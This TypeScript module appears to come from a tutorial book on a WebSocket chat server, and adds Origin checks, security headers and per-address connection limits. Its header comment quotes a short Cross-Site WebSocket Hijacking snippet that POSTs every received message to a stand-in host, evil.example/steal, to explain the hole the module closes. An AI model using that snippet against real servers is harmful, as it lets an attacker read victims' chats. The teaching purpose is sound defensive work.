// The things a server on the open internet has to say no to.
//
// This module exists because of a hole that has been in the code since Chapter 7,
// and it is the most serious thing in this book.

import type { HttpRequest } from "./http.js";

// --- Cross-Site WebSocket Hijacking --------------------------------------
//
// `wss.handleUpgrade()` has, since Chapter 7, accepted a WebSocket connection
// from **anybody**. Not any *user* - any *website*.
//
// Here is the attack, and it is four lines long:
//
//     // on https://evil.example, in a page the victim merely visits
//     const ws = new WebSocket("ws://your-chat-server:8080");
//     ws.onmessage = (e) => fetch("https://evil.example/steal", { method: "POST", body: e.data });
//
// The browser will happily open that socket. The Same-Origin Policy - the thing
// that stops evil.example reading a response from your bank - **does not apply to
// WebSockets.** It was written before they existed and it was never extended to
// them. `fetch()` is blocked by CORS; `new WebSocket()` is not, and there is no
// preflight, and there is no opt-in.
//
// What saves us, today, is an accident: our credential is a Bearer token that the
// client must send *deliberately*, in a message. A drive-by socket from
// evil.example has no token, so it can connect and then sit there being nobody.
//
// That is luck, not design. Had we used a cookie - which is the obvious, natural,
// widely-taught thing to do - the browser would attach it **automatically**, to
// this connection, from that page, and evil.example would be reading the victim's
// chat in real time. Chapter 22 chose a Bearer token for exactly this reason and
// said so at the time.
//
// So: check the Origin. It is the *only* defence a WebSocket has, and the fact
// that it is one line is not a reason to skip it - it is the reason there is no
// excuse for skipping it.

export interface OriginPolicy {
  // Which browser origins may open a socket. Empty means "no browser may" - which
  // is the right answer for a server with no web UI at all.
  readonly allowed: readonly string[];
  // A client with no Origin header at all is not a browser. `nc`, `wscat`, a
  // mobile app, a script - none of them send one, and none of them are subject to
  // the confused-deputy problem that Origin exists to solve, because none of them
  // will be tricked into attaching somebody else's credentials.
  //
  // So a missing Origin is allowed, and that is not the hole it looks like: an
  // attacker who can set arbitrary headers is not using a browser, and if they
  // are not using a browser they already have the victim's machine and Origin was
  // never going to save anybody.
  readonly allowNonBrowser: boolean;
}

// Is this upgrade request coming from somewhere we are willing to be embedded by?
export function isOriginAllowed(request: HttpRequest, policy: OriginPolicy): boolean {
  const origin = request.headers.get("origin");

  if (origin === undefined) {
    return policy.allowNonBrowser;
  }

  // Exact match, and only exact match.
  //
  // The classic bug here is `origin.endsWith("example.com")`, which cheerfully
  // accepts `https://evil-example.com` and `https://example.com.evil.net`. The
  // classic *other* bug is `origin.startsWith("https://example.com")`, which
  // accepts `https://example.com.evil.net` too. Substring checks on a security
  // boundary are how this goes wrong every single time.
  return policy.allowed.includes(origin);
}

// The origins a server is willing to be opened from, derived from where it is
// actually listening. A dev server on 127.0.0.1:8080 serves its own page from
// 127.0.0.1:8080, and that page must be able to connect back.
export function defaultOrigins(host: string, port: number): string[] {
  const hosts = host === "0.0.0.0" || host === "::" ? ["127.0.0.1", "localhost"] : [host];
  return hosts.flatMap((h) => [`http://${h}:${port}`, `https://${h}:${port}`]);
}

// --- Response headers ----------------------------------------------------

// Headers every HTML response should carry, and why.
//
// These are not magic. Each one turns off a specific thing a browser would
// otherwise do on your behalf, and each one has a name because somebody was
// exploited by it first.
export function securityHeaders(): Record<string, string> {
  return {
    // The page has no external scripts, styles, images, or fonts, and it never
    // will - it is one file, served from one place. So say so. This is the single
    // most effective anti-XSS measure there is: even if an attacker gets a
    // <script src="evil.example"> onto the page, the browser refuses to fetch it.
    //
    // 'unsafe-inline' is here because our script IS inline, and removing it means
    // a nonce or a hash on every deploy. That is the right thing to do and it is
    // Chapter 25's problem; leaving it *and knowing* is better than pretending.
    "Content-Security-Policy": [
      "default-src 'none'",
      "script-src 'unsafe-inline'",
      "style-src 'unsafe-inline'",
      "connect-src 'self' ws: wss:",
      "form-action 'none'",
      "frame-ancestors 'none'",
      "base-uri 'none'",
    ].join("; "),

    // Nobody may put this page in an iframe. Clickjacking is somebody rendering
    // your UI invisibly over a "click here for a free thing" button, and the fix
    // is to refuse to be rendered inside anything.
    "X-Frame-Options": "DENY",

    // A browser will otherwise *guess* the content type of a response by sniffing
    // its bytes - so a text file that happens to start with "<script>" becomes a
    // script. This turns the guessing off.
    "X-Content-Type-Options": "nosniff",

    // Do not leak the URL of this page (which may contain a room name) to any site
    // the user navigates to next.
    "Referrer-Policy": "no-referrer",

    // Turn off things the page has no business doing. A chat page does not need a
    // camera.
    "Permissions-Policy": "camera=(), microphone=(), geolocation=(), payment=()",
  };
}

// --- Connection limits ---------------------------------------------------

// One client can open a lot of sockets.
//
// Chapter 15 bounded what a *connection* could make us hold. This bounds how many
// connections one address may have at all - because a bound on each of a million
// things is not a bound.
export class ConnectionLimits {
  private readonly perAddress = new Map<string, number>();

  constructor(
    private readonly maxTotal: number,
    private readonly maxPerAddress: number,
  ) {}

  private total = 0;

  // Returns the reason for refusal, or undefined to allow.
  refuse(address: string): string | undefined {
    if (this.total >= this.maxTotal) {
      return "server is full";
    }
    if ((this.perAddress.get(address) ?? 0) >= this.maxPerAddress) {
      return "too many connections from this address";
    }
    return undefined;
  }

  opened(address: string): void {
    this.total += 1;
    this.perAddress.set(address, (this.perAddress.get(address) ?? 0) + 1);
  }

  closed(address: string): void {
    this.total = Math.max(0, this.total - 1);
    const count = (this.perAddress.get(address) ?? 1) - 1;
    if (count <= 0) {
      // Delete rather than leave a zero. A Map keyed by every IP that has ever
      // connected is a slow memory leak with a respectable job title.
      this.perAddress.delete(address);
    } else {
      this.perAddress.set(address, count);
    }
  }

  get openCount(): number {
    return this.total;
  }

  get addressCount(): number {
    return this.perAddress.size;
  }
}
